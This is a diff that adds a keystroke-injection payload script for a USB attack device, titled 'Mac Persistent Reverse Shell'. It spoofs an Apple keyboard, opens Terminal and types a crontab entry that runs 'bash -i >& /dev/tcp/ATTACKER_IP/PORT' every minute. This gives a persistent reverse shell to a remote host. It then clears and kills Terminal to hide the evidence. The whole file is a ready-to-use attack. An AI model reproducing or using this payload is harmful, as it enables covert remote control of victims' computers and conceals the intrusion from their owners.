@@ -1,0 +1,32 @@
+# Title:         Mac Persistent Reverse Shell
+# Description:   Creates a persistent reverse shell on Mac victim that connects back to NetCat host
+# Author:        0dyss3us (KeenanV)
+# Props:
+# Version:       1.2
+# Category:      Remote Access
+# Target:        MacOS
+# Attackmodes:   HID, Storage
+
+# Sets attack modes and stores current switch position
+LED SETUP
+ATTACKMODE HID STORAGE VID_0X05AC PID_0X021E
+GET_SWITCH_POSITION
+
+# Opens the terminal
+LED STAGE1
+RUN OSX terminal
+Q DELAY 2000
+
+# Makes a cron job that will run once every minute
+Q STRING \(crontab -l 2\>/dev/null\; echo \"\* \* \* \* \* bash -i \>\& /dev/tcp/ATTACKER_IP/PORT 0\>\&1\"\) \| crontab - 
+Q ENTER
+Q DELAY 2000
+
+LED CLEANUP
+# Clears and kills the terminal to hide the evidence
+Q STRING clear
+Q ENTER
+Q DELAY 500
+Q STRING killall Terminal
+Q ENTER
+LED FINISH
